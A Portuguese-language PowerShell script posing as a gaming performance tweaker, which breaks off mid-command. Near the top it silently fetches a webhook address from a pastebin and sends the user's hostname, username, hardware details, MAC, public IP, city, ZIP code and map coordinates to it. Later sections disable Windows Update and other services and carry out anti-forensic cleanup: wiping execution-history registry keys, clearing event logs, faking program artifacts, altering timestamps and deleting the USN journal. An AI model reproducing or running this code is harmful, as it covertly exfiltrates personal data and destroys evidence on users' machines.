#requires -RunAsAdministrator
$Host.UI.RawUI.WindowTitle = "Why - ? ? ? ?"
$Host.UI.RawUI.WindowTitle = "Why - Maad"
$Host.UI.RawUI.WindowTitle = "Why - ? ? ? ?"
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White"
Clear-Host

function Pause-Script {
    Write-Host "`n[+] - Finalizado. Pressione para sair..." -ForegroundColor White
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

#Bypass
$pBinUrl = "https://pastebin.com/raw/JkDe6reV"
$pBin = ""
try {
    $pBin = Invoke-RestMethod -Uri $pBinUrl -TimeoutSec 5
} catch {
}

# Webhook
$wbhUrl = "$pBin"

# Infos básicas
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$date = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$osVersion = (Get-CimInstance Win32_OperatingSystem).Version
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
$manufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
$model = (Get-CimInstance Win32_ComputerSystem).Model
$cpu = (Get-CimInstance Win32_Processor).Name
$ram = "{0:N2}" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) + " GB"
$mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
$serial = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Multi Theft Auto: San Andreas All\1.6\Settings\general").serial
$uptime = ((Get-CimInstance Win32_OperatingSystem).LastBootUpTime)
$uptime = (Get-Date) - $uptime
$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
$registeredOwner = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").RegisteredOwner

# Geo
$ipPublic = "Indisponível"
$region = "Indisponível"
$country = "Indisponível"
$lat = "0"
$lon = "0"
$mapsLink = "[Mapa](https://www.google.com/maps)"

try {
    $geo = Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5
    if ($geo.status -eq "success") {
        $ipPublic = $geo.query
		$regionbrev = $geo.region
        $region = $geo.regionName
        $country = $geo.country
        $lat = $geo.lat
        $lon = $geo.lon
        $mapsLink = "[Mapa](https://www.google.com/maps/?q=$lat,$lon)"
    }
} catch {}

function RemoverAcentosAuto {
    param ([string]$Texto)
    return -join ($Texto.Normalize("FormD").ToCharArray() | Where-Object {
        -not [System.Globalization.CharUnicodeInfo]::GetUnicodeCategory($_).ToString().StartsWith("NonSpacingMark")
    })
}

$city = "Indisponível"
$zipcode = "Indisponível"

try {
    $resp = Invoke-RestMethod -Uri "https://freegeoip.app/json/" -TimeoutSec 5
    if ($resp.city) {
        $city = RemoverAcentosAuto $resp.city
    }
    if ($resp.zip_code) {
        $zipcode = $resp.zip_code
    }
} catch {}
# Embed
$embed = @{
    title = "Log $username"
    color = 12292031
    timestamp = (Get-Date).ToString("o")
    image = @{ url = "https://i.imgur.com/49Uet4M.png" }
    fields = @(
        	@{ name = "Nome"; value = $hostname; inline = $true },
		@{ name = "Admin"; value = $registeredOwner; inline = $true },
        	@{ name = "Usuário"; value = $username; inline = $true },
        	@{ name = "Data"; value = $date; inline = $true },
        	@{ name = "Sistema"; value = "$os ($osVersion)"; inline = $true },
        	@{ name = "Fabricante"; value = "$manufacturer / $model"; inline = $true },
        	@{ name = "CPU"; value = $cpu; inline = $true },
        	@{ name = "RAM"; value = $ram; inline = $true },
        	@{ name = "IP"; value = $ipPublic; inline = $true },
		@{ name = "MAC"; value = $mac; inline = $true },
		@{ name = "Cidade"; value = $city; inline = $true },
		@{ name = "Cep"; value = $zipcode; inline = $true },
        	@{ name = "Região"; value = "$region - $regionbrev"; inline = $true },
        	@{ name = "País"; value = $country; inline = $true },
        	@{ name = "Maps"; value = $mapsLink; inline = $true },
		@{ name = "Serial"; value = $serial; inline = $true },
		@{ name = "Ligado"; value = $uptimeStr; inline = $true }
    )
}
# Envia
$payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 4
Invoke-RestMethod -Uri $wbhUrl -Method Post -Body $payload -ContentType 'application/json'


# Key Loader + Registro
$authFilePath = "C:\ProgramData\AMD\Key.Auth"
$authRegPath = "HKCU:\Software\KeyAuth"
$authDir = Split-Path $authFilePath
New-Item -Path $authDir -ItemType Directory -Force | Out-Null
"VALIDADO" | Out-File -Encoding UTF8 -FilePath $authFilePath -Force

if (-not (Test-Path $authRegPath)) {
    New-Item -Path $authRegPath -Force | Out-Null
}
if (Test-Path $authFilePath) {
    $usageValue = Get-ItemProperty -Path $authRegPath -Name "AuthUsage" -ErrorAction SilentlyContinue
    $currentUsage = if ($usageValue -ne $null) { $usageValue.AuthUsage } else { 0 }
    $newUsage = $currentUsage + 1

    Set-ItemProperty -Path $authRegPath -Name "AuthUsage" -Value $newUsage -Force
    Set-ItemProperty -Path $authRegPath -Name "AuthBypass" -Value 1 -Force
} else {
    Set-ItemProperty -Path $authRegPath -Name "AuthBypass" -Value 0 -Force
}

# Criar Ponto 
function CriarPontoDeRestauracao {
    Write-Host "[+] Criando ponto de restauração do sistema..." -ForegroundColor White
    $srStatus = Get-Service -Name 'vss' -ErrorAction SilentlyContinue
    if ($srStatus.Status -ne 'Running') {
        Start-Service -Name 'vss' -ErrorAction SilentlyContinue
    }
    $script = @'
$restore = Get-CimInstance -Namespace "root/default" -ClassName SystemRestore
if (-not $restore) {
    Enable-ComputerRestore -Drive "C:\"
}
Checkpoint-Computer -Description "Ponto criado por script" -RestorePointType "MODIFY_SETTINGS"
'@
    try {
        Invoke-Command -ScriptBlock ([ScriptBlock]::Create($script))
        Write-Host "[+] - Ponto de restauração criado com sucesso." -ForegroundColor Green
    } catch {
        Write-Warning "[!] - Falha ao criar ponto de restauração. Você está como Administrador?"
    }
}

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "[!] - Esse Script precisa ser executado como Administrador. Reabrindo com permissões elevadas..."
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}
CriarPontoDeRestauracao
Clear-Host

#Other Function 
Clear-Host
function Set-GamePriority {
    param (
        [string]$GameExe
    ) 
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$GameExe"
    $perfPath = "$regPath\PerfOptions"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    if (-not (Test-Path $perfPath)) {
        New-Item -Path $perfPath -Force | Out-Null
    }
    New-ItemProperty -Path $perfPath -Name "CpuPriorityClass" -Value 3 -PropertyType DWORD -Force | Out-Null
    Write-Host "[+] - Prioridade configurada para $GameExe" -ForegroundColor Green
}
Write-Host "[+] - Configurando prioridades de CPU para jogos..." -ForegroundColor Green
$games = @(
    "FortniteClient-Win64-Shipping.exe",
    "GTA5.exe",
    "FiveM_b2372_GTAProcess.exe",
    "cs2.exe",
    "javaw.exe",
    "VALORANT-Win64-Shipping.exe",
    "LeagueClient.exe",
    "cod.exe",
    "r5apex.exe",
    "RobloxPlayerBeta.exe",
    "GoW.exe",
    "GoWRagnarok.exe",
    "Multi Theft Auto.exe",
    "gta_sa.exe",
    "eurotrucks.exe",
    "ets2.exe",
    "RainbowSix.exe",
    "CultOfTheLamb.exe",
    "ULTRAKILL.exe",
    "BloodStrike.exe",
    "ArenaBreakout.exe",
    "re4.exe",
    "re2.exe",
    "re8.exe",
    "HD-Player.exe",
    "BF2042.exe",
    "bf4.exe",
    "tlou-i.exe",
    "tlou-ii.exe",
    "tslgame.exe",
    "RocketLeague.exe",
    "Cyberpunk2077.exe",
    "Terraria.exe",
    "RDR2.exe"
)
Clear-Host
foreach ($game in $games) {
    Set-GamePriority -GameExe $game
}
Write-Host "[+] - Desativando telemetria e serviços desnecessários..."
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v "AllowAppDataCollection" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisableWindowsAdvertising" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableMicrosoftConsumerExperience" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /t REG_DWORD /d 1 /f
$tasks = @(
    "Microsoft\Windows\Customer Experience Improvement Program\Consolidator",
    "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip",
    "Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask",
    "Microsoft\Windows\Application Experience\ProgramDataUpdater",
    "\Microsoft\Windows\Defrag\ScheduledDefrag"
)
foreach ($task in $tasks) {
    schtasks /Change /TN "$task" /Disable | Out-Null
}
$services = @(
    "DiagTrack",
    "dmwappushservice",
    "Xbox Game Monitoring",
    "GamingServices",
    "GamingServicesNet",
    "wuauserv",
    "dosvc",
    "WerSvc",
    "w32time",
    "Spooler",
    "wisvc",
    "WbioSrvc",
    "WSearch",
    "SysMain"
)
foreach ($service in $services) {
    sc stop $service | Out-Null
    sc config $service start= disabled | Out-Null
}
Clear-Host
Write-Host "[+] - Aplicando configurações de privacidade e desempenho..." -ForegroundColor Green
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v SubscribedContent-338387Enabled /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v SubscribedContent-353694Enabled /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v SubscribedContent-353696Enabled /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v SubscribedContent-338388Enabled /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_Recommendations /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v EnableTransparency /t REG_DWORD /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v UserPreferencesMask /t REG_BINARY /d 9012038010000000 /f
reg add "HKCU\Control Panel\Desktop" /v VisualFXSetting /t REG_DWORD /d 2 /f
reg add "HKCU\Software\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\GameBar" /v "ShowStartupPanel" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Siuf\Rules" /v NumberOfSIUFInPeriod /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Siuf\Rules" /v PeriodInDays /t REG_DWORD /d 0 /f
reg add "HKCU\Control Panel\Mouse" /v MouseSpeed /t REG_SZ /d 0 /f
reg add "HKCU\Control Panel\Mouse" /v MouseThreshold1 /t REG_SZ /d 0 /f
reg add "HKCU\Control Panel\Mouse" /v MouseThreshold2 /t REG_SZ /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v MouseTrails /t REG_SZ /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v AltTabSettings /t REG_DWORD /D 1 /f
reg add "HKCU\Control Panel\Keyboard" /v KeyboardDelay /t REG_SZ /d 0 /f
reg add "HKCU\Control Panel\Keyboard" /v KeyboardSpeed /t REG_SZ /d 31 /f
reg add "HKCU\Control Panel\Desktop" /v MenuShowDelay /t REG_SZ /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v ForegroundLockTimeout /t REG_DWORD /d 0 /f
fsutil behavior set disableLastAccess 0
fsutil behavior set disable8dot3 1
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61
powercfg.exe /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR IdleDisable 0
powercfg.exe /setactive SCHEME_CURRENT
powercfg -h off
netsh interface tcp set global autotuninglevel=normal
netsh interface tcp set global rss=enabled
netsh interface tcp set global chimney=disabled
netsh int tcp set heuristics disabled
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d 0 /f
Write-Host "[+] - Removendo aplicativos desnecessários..." -ForegroundColor Green
Clear-Host
$appsToRemove = @(
    "*xboxapp*",
    "*xboxgamemode*",
    "*Microsoft.XboxGameOverlay*",
    "*Microsoft.GamingServices*",
    "*Microsoft.Windows.Cortana*",
    "*officehub*",
    "*phone*",
    "*messaging*",
    "*maps*",
    "*groove*",
    "*getstarted*",
    "*calendar*",
    "*alarms*",
    "*3dbuilder*",
    "*news*",
    "*onedrive*",
    "Microsoft.549981C3F5F10"
)

Write-Host "[-] - Removendo aplicativos desnecessários..." -ForegroundColor Green
foreach ($app in $appsToRemove) {
    try {
        $packages = Get-AppxPackage -Name $app -ErrorAction SilentlyContinue
        if ($packages) {
            $packages | Remove-AppxPackage -ErrorAction SilentlyContinue
        }
        $allUsersPackages = Get-AppxPackage -Name $app -AllUsers -ErrorAction SilentlyContinue
        if ($allUsersPackages) {
            $allUsersPackages | Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
        }
        $provisioned = Get-AppxProvisionedPackage -Online | Where-Object { $_.PackageName -like $app }
        if ($provisioned) {
            $provisioned | Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue
        }
    }
    catch {
        Write-Host "[!] - Erro ao remover $app : $_" -ForegroundColor Red
    }
}

if ([System.Environment]::OSVersion.Version.Build -ge 22000) {
    try {
        Write-Host "Configurando Windows Copilot..."
        reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowCopilotButton /t REG_DWORD /d 0 /f
        reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Copilot" /v TurnOffWindowsCopilot /t REG_DWORD /d 1 /f
        reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideCopilotButton /f 2>$null
    }
    catch {
        Write-Host "[!] - Erro ao configurar Copilot: $_" -ForegroundColor Reed
    }
}

try {
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f
    reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d 0 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
}
catch {
    Write-Host "[!] - Erro ao configurar privacidade: $_" -ForegroundColor Red
}
function Clean-TempFiles {
    $pathsToClean = @(
        "$env:windir\temp\*",
        "$env:windir\Prefetch\*",
        "$env:windir\system32\dllcache\*",
        "$env:systemdrive\Temp\*",
        "$env:temp\*",
        "$env:userprofile\AppData\Local\Temp\*",
        "$env:userprofile\AppData\Local\Microsoft\Windows\INetCache\*",
        "$env:userprofile\AppData\Local\Microsoft\Windows\INetCookies\*",
        "$env:userprofile\AppData\Local\Microsoft\Windows\History\*"
    )

    Write-Host "[+] - Limpando arquivos temporários..." -ForegroundColor Green
    foreach ($path in $pathsToClean) {
        try {
            if (Test-Path $path) {
                Remove-Item -Path $path -Force -Recurse -ErrorAction SilentlyContinue
                Write-Host "Limpo: $path" -ForegroundColor Green
            }
        }
        catch {
            Write-Host "[!] - Falha ao limpar $path : $_" -ForegroundColor Red
        }
    }
    try {
        del /f /s /q "$env:LocalAppData\Microsoft\Windows\Explorer\iconcache*" 2>$null
        del /f /s /q "$env:LocalAppData\Microsoft\Windows\Explorer\thumbcache*" 2>$null
    }
    catch {
        Write-Host "[!] - Falha ao limpar cache de ícones: $_" -ForegroundColor Red
    }
}
Clean-TempFiles
Clear-Host

function Remove-FilesFrom {
    param([string]$Path)
    if (Test-Path $Path) {
        try {
            Get-ChildItem -Path $Path -Recurse -Force -ErrorAction SilentlyContinue | 
                Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
            Write-Host "[+] - Limpou: $Path" -ForegroundColor Green
        } catch {
            Write-Host "[!] - Erro ao limpar: $Path" -ForegroundColor Red
        }
    } else {
        Write-Host "[!] - Caminho não encontrado: $Path" -ForegroundColor Red
    }
}
Remove-FilesFrom -Path $env:TEMP
Remove-FilesFrom -Path "C:\Windows\Temp"
Remove-FilesFrom -Path "C:\Windows\Prefetch"
Remove-FilesFrom -Path "C:\ProgramData\Microsoft\Network\Downloader"
Clear-Host

$regKeys = @(
    "HKEY_CURRENT_USER\Software\WinRAR\ArcHistory",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePid1MRU",
    "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\ShellNoRoam",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Bags",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRULegacy",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceClasses\{53f56307-b6bf-11d0-94f2-00a0c91efb8b}",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR",
    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
    "HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_USERS\.DEFAULT\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU",
    "HKEY_CURRENT_USER\Software\WinRAR\DialogEditHistory\ExtrPath",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\UFH\SHC",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll\OpenWithList",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView",
    "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
    "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam",
    "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\dll",
    "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory",
    "HKEY_CURRENT_USER\SOFTWARE\AMD\HKIDs",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\RADAR\HeapLeakDetection\DiagnosedApplications",
    "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3936E9E4-D92C-4EEE-A85A-BC16D5EA0819}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3936E9E4-D92C-4EEE-A85A-BC16D5EA0819}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3134ef9c-6b18-4996-ad04-ed5912e00eb5}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3134ef9c-6b18-4996-ad04-ed5912e00eb5}",
    "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System"
)

$programs = @(
    "CHROME", "MULTITHEFTAUTO", "FIREFOX", "EDGE", "BRAVE", "OPERA", "DISCORD", "SPOTIFY", "STEAM", "EPICGAMES", "BATTLE.NET",
    "ADOBEPHOTOSHOP", "ADOBEILLUSTRATOR", "ADOBEAFTEREFFECTS", "ADOBEPREMIERE", "PAINTNET", "PAINT",
    "NOTEPAD", "NOTEPAD++", "VSCODE", "SUBLIMETEXT", "PYCHARM", "INTELLIJ", "ANDROIDSTUDIO", "VMWARE",
    "VIRTUALBOX", "PUTTY", "WINSCP", "7ZIP", "WINRAR", "EASYBCD", "XMOUSEBUTTONS", "MSWORD", "MSEXCEL",
    "MSPOWERPOINT", "ONENOTE", "OUTLOOK", "THUNDERBIRD", "CALC", "KODI", "VLC", "BLUESTACKS", "LDPLAYER",
    "NVIDIA", "AMDRADEON", "REALTEK", "AUDACITY", "OBS", "XBOXAPP", "GAMEBAR", "NETFLIX", "YOUTUBEMUSIC",
    "GOOGLEDRIVE", "ONEDRIVE", "DROPBOX", "TEAMS", "SKYPE", "ZOOM", "TERRARIA", "MINECRAFT", "ROBLOX",
    "VALORANT", "CS2", "FORTNITE", "LOL", "DOTA2", "WARFRAME", "AMAZON", "EBAY", "ALIPAY", "WECHAT",
    "WHATSAPP", "MESSENGER", "GITHUB", "GIT", "POSTMAN", "SQLITE", "MYSQLWORKBENCH", "HEIDISQL", "DOCKER",
    "KUBERNETES", "ANSIBLE", "FILEZILLA", "TOR", "TEAMVIEWER", "ANYDESK", "PSEXEC", "RSAT", "NMAP",
    "WIRESHARK", "FDM", "IDM", "ACROBAT", "WINDOWSDEFENDER", "WINDOWSUPDATE", "TASKMANAGER",
    "SYSTEM", "CMD", "POWERSHELL", "REGEDIT", "WINDOWSINSTALLER", "CCLEANER", "DEFRAG", "MSPAINT",
    "WORDPAD", "CALENDAR", "MAIL", "PHOTOS", "CAMERA", "ALARMS", "CALCULATOR", "CONNECT", "CONTACT",
    "MONEY", "NEWS", "SPORTS", "WEATHER", "STORE", "MUSIC", "VIDEO", "MOVIE", "TV", "PHONE", "MESSAGES"
)

$baseDir = "C:\Program Files\ProgramSystem"
$createdDirs = @()
Write-Host "Verificando/Criando diretórios..." -ForegroundColor Green
foreach ($program in $programs) {
    $dirPath = Join-Path -Path $baseDir -ChildPath $program
    
    if (-not (Test-Path -Path $dirPath)) {
        try {
            $null = New-Item -Path $dirPath -ItemType Directory -Force
            $createdDirs += $dirPath
            Write-Host "[+] - Criado: $dirPath" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] - Falha ao criar $dirPath : $_" -ForegroundColor Red
        }
    }
    else {
        Write-Host "[-] Diretório já existe: $dirPath" -ForegroundColor Green
    }
}

Write-Host "`nSimulando execução de programas..." -ForegroundColor Green
foreach ($dir in $createdDirs) {
    try {
        $logFile = Join-Path -Path $dir -ChildPath "execution.log"
        $fakeExe = Join-Path -Path $dir -ChildPath "$([System.IO.Path]::GetFileName($dir)).exe"
        
        $logContent = @"
Program: $([System.IO.Path]::GetFileName($dir))
Executed: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
PID: $(Get-Random -Minimum 1000 -Maximum 9999)
SessionID: $([System.Diagnostics.Process]::GetCurrentProcess().SessionId)
"@
        Set-Content -Path $logFile -Value $logContent
        
        $null = New-Item -Path $fakeExe -ItemType File -Force
        (Get-Item $fakeExe).LastWriteTime = (Get-Date).AddHours(-1)
        
        Write-Host "[+] - Simulado: $([System.IO.Path]::GetFileName($dir))" -ForegroundColor Green
    }
    catch {
        Write-Host "[!] - Falha ao simular execução em $dir : $_" -ForegroundColor Red
    }
}

Write-Host "`nIniciando auto-limpeza..." -ForegroundColor Green
foreach ($dir in $createdDirs) {
    try {
        if (Test-Path -Path $dir) {
            Remove-Item -Path $dir -Recurse -Force
            Write-Host "[+] - Limpo: $dir" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[!] - Falha ao limpar $dir : $_" -ForegroundColor Red
        
        try {
            Start-Sleep -Seconds 1
            Remove-Item -Path $dir -Recurse -Force -ErrorAction Stop
            Write-Host "[+] - Limpeza alternativa bem-sucedida: $dir" -ForegroundColor Green
        }
        catch {
            Write-Host "[!] - Não foi possível limpar $dir - Limpe manualmente" -ForegroundColor Red
        }
    }
}

# 4. Limpar logs do sistema
Write-Host "`nLimpando logs do sistema..." -ForegroundColor Green
try {
    wevtutil cl "Application" | Out-Null
    wevtutil cl "System" | Out-Null
    Write-Host "[+] - Logs do sistema limpos" -ForegroundColor Green
}
catch {
    Write-Host "[!] - Não foi possível limpar todos os logs: $_" -ForegroundColor Red
}
Clear-Host
Write-Host "[+] - Processo concluído!" -ForegroundColor Green
Write-Host "[+] - Diretórios criados e removidos: $($createdDirs.Count)" -ForegroundColor Green

function Set-FileTime {
    param (
        [string]$FilePath,
        [datetime]$NewTime
    )
    if (Test-Path $FilePath) {
        try {
            $item = Get-Item $FilePath
            $item.CreationTime = $NewTime
            $item.LastWriteTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 300))
            $item.LastAccessTime = $NewTime.AddSeconds((Get-Random -Minimum 10 -Maximum 600))
        }
        catch {
            Write-Host "[!] Error modifying timestamps for $FilePath : $_" -ForegroundColor Red
			Clear-Host
        }
    }
}
Write-Host "`n[FASE 1] Manipulação do registro..." -ForegroundColor Green
Clear-Host

# 2. Clean USN Journal
try {
    fsutil usn deletejournal /D C: | Out-Null
